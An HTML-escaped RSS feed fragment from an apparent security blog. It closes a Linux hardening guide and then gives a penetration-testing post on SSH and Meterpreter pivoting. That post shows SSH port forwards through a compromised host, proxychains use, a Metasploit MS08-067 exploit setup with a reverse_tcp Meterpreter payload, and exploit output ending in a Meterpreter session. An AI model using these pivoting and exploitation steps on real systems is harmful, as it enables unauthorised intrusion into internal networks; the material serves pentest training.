     &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf
     &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;# Set fs.suid_dumpable to 0 per security requirements&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf
     &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;fs.suid_dumpable = 0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;buffer-overflow-protection&quot;&gt;Buffer Overflow Protection&lt;/h2&gt;

&lt;p&gt;This section helps mitigate against Buffer Overflow attacks (BOF).&lt;/p&gt;

&lt;h3 id=&quot;enable-execshield&quot;&gt;Enable ExecShield&lt;/h3&gt;

&lt;p&gt;Helps prevent stack smashing / BOF.&lt;/p&gt;

&lt;p&gt;Enable on current kernel: &lt;code&gt;sysctl -w kernel.exec-shield=1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Add to /etc/sysctl.conf:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;kernel.exec-shield &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;check--enable-aslr&quot;&gt;Check / Enable ASLR&lt;/h3&gt;

&lt;p&gt;Set runtime for kernel.randomize_va_space &lt;code&gt;sysctl -q -n -w kernel.randomize_va_space=2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Add &lt;code&gt;kernel.randomize_va_space = 2&lt;/code&gt; to /etc/sysctl.conf if it does not already exist.&lt;/p&gt;

&lt;h3 id=&quot;enable-xd-or-nx-support-on-x86-systems&quot;&gt;Enable XD or NX Support on x86 Systems&lt;/h3&gt;

&lt;p&gt;Recent processors in the x86 family support the ability to prevent code execution on a per memory page basis. Generically and on AMD processors, this ability is called &lt;strong&gt;No Execute (NX)&lt;/strong&gt;, while on Intel processors it is called &lt;strong&gt;Execute Disable (XD)&lt;/strong&gt;. This ability can help prevent exploitation of buffer overflow vulnerabilities and should be activated whenever possible. Extra steps must be taken to ensure that this protection is enabled, particularly on 32-bit x86 systems. Other processors, such as Itanium and POWER, have included such support since inception and the standard kernel for those platforms supports the feature.&lt;/p&gt;

&lt;p&gt;Check bios and ensure XD/NX is enabled, not relevant for VM’s.&lt;/p&gt;

&lt;h2 id=&quot;selinux&quot;&gt;SELinux&lt;/h2&gt;

&lt;h3 id=&quot;confirm-selinux-is-not-disabled&quot;&gt;Confirm SELinux is not disabled&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/selinux=0//gI&quot;&lt;/span&gt; /etc/grub.conf
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/enforcing=0//gI&quot;&lt;/span&gt; /etc/grub.conf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;selinux-targeted--enforcing&quot;&gt;SELinux Targeted / Enforcing&lt;/h3&gt;

&lt;p&gt;Open /etc/selinux/config and check for &lt;code&gt;SELINUXTYPE=targeted&lt;/code&gt; or &lt;code&gt;SELINUXTYPE=enforcing&lt;/code&gt;, depending on your requirements.&lt;/p&gt;

&lt;h3 id=&quot;enable-the-selinux-restorecond-service&quot;&gt;Enable the SELinux restorecond Service&lt;/h3&gt;

&lt;p&gt;The restorecond service utilizes inotify to look for the creation of new files listed in the /etc/selinux/restorecond.conf configuration file. When a file is created, restorecond ensures the file receives the proper SELinux security context. The restorecond service can be enabled with the following command:&lt;/p&gt;

&lt;p&gt;Enable restorecond for all run levels:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;chkconfig --level 0123456 restorecond on&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Start restorecond if not currently running:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;service restorecond start&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;check-no-daemons-are-unconfined-by-selinux&quot;&gt;Check no daemons are unconfined by SELinux&lt;/h3&gt;
&lt;p&gt;Run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-eZ&lt;/span&gt; | egrep &lt;span class=&quot;s2&quot;&gt;&quot;initrc&quot;&lt;/span&gt; | egrep &lt;span class=&quot;nt&quot;&gt;-vw&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;tr|ps|egrep|bash|awk&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{ print $NF }’&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This should return no output.&lt;/p&gt;

&lt;h2 id=&quot;prevent-log-in-to-accounts-with-empty-password&quot;&gt;Prevent Log In to Accounts With Empty Password&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/\&amp;lt;nullok\&amp;gt;//g'&lt;/span&gt; /etc/pam.d/system-auth&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;secure-ssh&quot;&gt;Secure SSH&lt;/h2&gt;

&lt;h3 id=&quot;allow-only-ssh-protocol-2&quot;&gt;Allow Only SSH Protocol 2&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; and ensure the following line exists:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Protocol 2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;limit-users-ssh-access&quot;&gt;Limit Users’ SSH Access&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; and add:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;DenyUsers USER1 USER2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;set-ssh-idle-timeout-interval&quot;&gt;Set SSH Idle Timeout Interval&lt;/h3&gt;

&lt;p&gt;To set an idle timeout interval, edit the following line in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; as follows:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ClientAliveInterval interval&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;set-ssh-client-alive-count&quot;&gt;Set SSH Client Alive Count&lt;/h3&gt;

&lt;p&gt;To ensure the SSH idle timeout occurs precisely when the ClientAliveCountMax is set, edit &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; as follows:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ClientAliveCountMax 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-ssh-support-for-rhosts-files&quot;&gt;Disable SSH Support for .rhosts Files&lt;/h3&gt;

&lt;p&gt;SSH can emulate the behavior of the obsolete rsh command in allowing users to enable insecure access to their accounts via .rhosts files.&lt;/p&gt;

&lt;p&gt;To ensure this behavior is disabled, add or correct the following line in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;IgnoreRhosts &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-host-based-authentication&quot;&gt;Disable Host-Based Authentication&lt;/h3&gt;

&lt;p&gt;SSH’s cryptographic host-based authentication is more secure than .rhosts authentication. However, it is not recommended that hosts unilaterally trust one another, even within an organization.&lt;/p&gt;

&lt;p&gt;To disable host-based authentication, add or correct the following line in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;HostbasedAuthentication no&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-ssh-root-login&quot;&gt;Disable SSH Root Login&lt;/h3&gt;

&lt;p&gt;Disable root logins via SSH, open &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; and ensure the following line exists:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PermitRootLogin no&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-ssh-access-via-empty-passwords&quot;&gt;Disable SSH Access via Empty Passwords&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PermitEmptyPasswords no&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;enable-ssh-warning-banner&quot;&gt;Enable SSH Warning Banner&lt;/h3&gt;

&lt;p&gt;Enable a warning banner (Renforce policy awareness).&lt;/p&gt;

&lt;p&gt;Banner &lt;code&gt;/etc/issue&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;do-not-allow-ssh-environment-options&quot;&gt;Do Not Allow SSH Environment Options&lt;/h3&gt;

&lt;p&gt;To ensure users are not able to present environment options to the SSH daemon, add or correct the following line in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PermitUserEnvironment no&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;use-only-approved-ciphers&quot;&gt;Use Only Approved Ciphers&lt;/h3&gt;

&lt;p&gt;Limit the ciphers to those algorithms which are FIPS-approved. Counter (CTR) mode is also preferred over cipher-block chaining (CBC) mode. The following line in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; demonstrates use of FIPS-approved ciphers:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;secure-x-windows&quot;&gt;Secure X Windows&lt;/h2&gt;

&lt;h3 id=&quot;disable-x-windows-startup-by-setting-runlevel&quot;&gt;Disable X Windows Startup By Setting Runlevel&lt;/h3&gt;

&lt;p&gt;Disable X windows system, further reducing your attack surface.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Add &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:3:initdefault: to /etc/inittab.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;remove-the-x-windows-package-group&quot;&gt;Remove the X Windows Package Group&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yum groupremove &lt;span class=&quot;s2&quot;&gt;&quot;X Window System&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;prompt-os-update-installation&quot;&gt;Prompt OS update installation&lt;/h2&gt;

&lt;p&gt;A process for prompt installation of OS updates must exist&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yum &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;yum-cron
chkconfig yum-cron on&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Make sure yum-cron is set to “check only”, I don’t recommend installing updates automatically.&lt;/p&gt;

&lt;p&gt;If this was helpfull, click tweet below.&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>SSH &amp; Meterpreter Pivoting Techniques</title>
          <link>https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/</link>
          <pubDate>Fri, 20 Mar 2015 00:52:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Metasploit</category>
          
          <category>Meterpreter</category>
          
          
          <category>techniques</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-pivoting-&quot; id=&quot;markdown-toc-what-is-pivoting-&quot;&gt;What is Pivoting ?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssh-pivoting-cheatsheet&quot; id=&quot;markdown-toc-ssh-pivoting-cheatsheet&quot;&gt;SSH Pivoting Cheatsheet&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#ssh-port-forwarding&quot; id=&quot;markdown-toc-ssh-port-forwarding&quot;&gt;SSH Port Forwarding&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ssh-port-forwarding-with-proxychains&quot; id=&quot;markdown-toc-ssh-port-forwarding-with-proxychains&quot;&gt;SSH Port Forwarding with Proxychains&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#using-proxychain-port-forwards&quot; id=&quot;markdown-toc-using-proxychain-port-forwards&quot;&gt;Using Proxychain port forwards&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#configure-metasploit-to-use-a-ssh-pivot&quot; id=&quot;markdown-toc-configure-metasploit-to-use-a-ssh-pivot&quot;&gt;Configure Metasploit to use a SSH Pivot&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#dont-use-127001-with-metasploit&quot; id=&quot;markdown-toc-dont-use-127001-with-metasploit&quot;&gt;Don’t use 127.0.0.1 with Metasploit&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#meterpreter-pivoting-cheatsheet&quot; id=&quot;markdown-toc-meterpreter-pivoting-cheatsheet&quot;&gt;Meterpreter Pivoting Cheatsheet&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pivoting-example-diagrams&quot; id=&quot;markdown-toc-pivoting-example-diagrams&quot;&gt;Pivoting Example Diagrams&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#starting-point&quot; id=&quot;markdown-toc-starting-point&quot;&gt;Starting Point&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#routing-traffic-to-the-same-subnet&quot; id=&quot;markdown-toc-routing-traffic-to-the-same-subnet&quot;&gt;Routing Traffic to the Same Subnet&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#ssh-pivoting-using-proxychains&quot; id=&quot;markdown-toc-ssh-pivoting-using-proxychains&quot;&gt;SSH Pivoting using Proxychains&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ssh-port-forwarding-command&quot; id=&quot;markdown-toc-ssh-port-forwarding-command&quot;&gt;SSH Port Forwarding Command&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ssh-and-meterpreter-pivoting&quot; id=&quot;markdown-toc-ssh-and-meterpreter-pivoting&quot;&gt;SSH and Meterpreter Pivoting&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#example-commands&quot; id=&quot;markdown-toc-example-commands&quot;&gt;Example commands&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-pivoting-&quot;&gt;What is Pivoting ?&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Pivoting&lt;/strong&gt; is a technique used to route traffic through a compromised host on a penetration test.&lt;/p&gt;

&lt;p&gt;When conducting an external penetration test you may need to route traffic through a compromised machine in order to compromise internal targets.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pivoting&lt;/strong&gt;, allows you to leverage &lt;a href=&quot;/blog/penetration-testing-tools-cheat-sheet/&quot;&gt;pen test tools&lt;/a&gt; on your attacking machine while routing traffic through other hosts on the subnet, and potentially allowing access to other subnets.&lt;/p&gt;

&lt;h2 id=&quot;ssh-pivoting-cheatsheet&quot;&gt;SSH Pivoting Cheatsheet&lt;/h2&gt;

&lt;h3 id=&quot;ssh-port-forwarding&quot;&gt;SSH Port Forwarding&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ssh -L 9999:10.0.2.2:445 user@192.168.2.250&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssh-port-forwarding-with-proxychains&quot;&gt;SSH Port Forwarding with Proxychains&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ssh -D 127.0.0.1:9050 root@192.168.2.250&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Dynamically allows all port forwards to the subnets availble on the target.&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;Dynamic Proxychain Warning&lt;/h5&gt;
  &lt;p&gt;Dynamic Proxychain SSH port forwarding does not work with nmap and metasploits meterpreter shells won't spawn.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;If you attempt to spawn a shell via Meterpreter, you’ll get an error similar to the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; execute &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; cmd.exe &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt;
|S-chain|-&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-127&lt;/span&gt;.0.0.1:9050-&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-127&lt;/span&gt;.0.0.1:41713-&amp;lt;&lt;span class=&quot;nt&quot;&gt;--timeout&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;using-proxychain-port-forwards&quot;&gt;Using Proxychain port forwards&lt;/h3&gt;

&lt;p&gt;When using a Proxychain port forward, all commands need to be prefixed with the proxychain command, this instructs the application traffic to route through the proxy.&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Connecting to RDP via Proxychains Dynamic Port Forwarding&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;proxychains rdesktop TARGET-IP&lt;/span&gt;
        &lt;/p&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;h2 id=&quot;configure-metasploit-to-use-a-ssh-pivot&quot;&gt;Configure Metasploit to use a SSH Pivot&lt;/h2&gt;

&lt;p&gt;The following is an example of how to configure Metersploit to use a SSH portward. In this example port 9999 is forwarded to the target and the attacking machine has an IP address of 192.168.2.100:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Setup the port forward &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;instructions above&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;configure msfconsole as follows &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using MS08_067 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this example&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

 msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ms08_067_netapi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

 Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/smb/ms08_067_netapi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

    Name     Current Setting  Required  Description
    &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   RHOST    0.0.0.0          &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address
    RPORT    9999             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Set the SMB service port
    SMBPIPE  BROWSER          &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The pipe name to use &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BROWSER, SRVSVC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


 Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

    Name      Current Setting  Required  Description
    &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   EXITFUNC  thread           &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Exit technique &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;accepted: seh, thread, process, none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    LHOST     192.168.2.100   &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address
    LPORT     443              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


 Exploit target:

    Id  Name
    &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Automatic Targeting&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;dont-use-127001-with-metasploit&quot;&gt;Don’t use 127.0.0.1 with Metasploit&lt;/h3&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Update: You can now use 127.0.0.2&lt;/h5&gt;
  &lt;p&gt;Other 127.0.0.0 addresses can also be used (&lt;code&gt;127.0.0.3&lt;/code&gt;,&lt;code&gt;127.0.0.4&lt;/code&gt; etc), but not &lt;code&gt;127.0.0.1&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;The example above uses 0.0.0.0 &lt;strong&gt;Not 127.0.0.1&lt;/strong&gt;, never use 127.0.0.1 with Metasploit or you’ll get the following error after you attempt to do anything post exploit:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ms08_067_netapi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse handler on 192.168.14.183:443
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Automatically detecting the target...
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Fingerprint: Windows XP - Service Pack 3 - lang:English
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Selected Target: Windows XP SP3 English &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AlwaysOn NX&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to trigger the vulnerability...
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;769536 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 192.168.15.252

msf meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; getuid
